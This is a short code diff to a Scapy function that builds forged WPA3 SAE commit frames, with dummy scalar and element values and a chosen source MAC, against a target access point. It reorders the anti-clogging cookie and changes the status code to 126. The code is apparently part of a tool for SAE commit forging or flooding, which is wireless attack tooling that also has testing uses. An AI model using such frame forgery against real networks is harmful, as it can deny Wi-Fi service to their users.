@@ -23,7 +23,7 @@ def commit_frame(target_mac:str, src_mac:str,cookie=None):
 
     frame = None
     if cookie != None:
-        sae_payload = b'\x13\x00' + cookie + dummy_scalar + dummy_element
+        sae_payload = b'\x13\x00' + dummy_scalar + dummy_element + cookie
         frame = (
             Dot11FCS(
                 proto=0,
@@ -35,7 +35,7 @@ def commit_frame(target_mac:str, src_mac:str,cookie=None):
                 addr3=target_mac, # BSSID is typically the AP's MAC
                 SC=(1 << 4)
                 ) /
-            Dot11Auth(algo=3, seqnum=1, status=0) /
+            Dot11Auth(algo=3, seqnum=1, status=126) /
             Raw(load=sae_payload)
         )
     
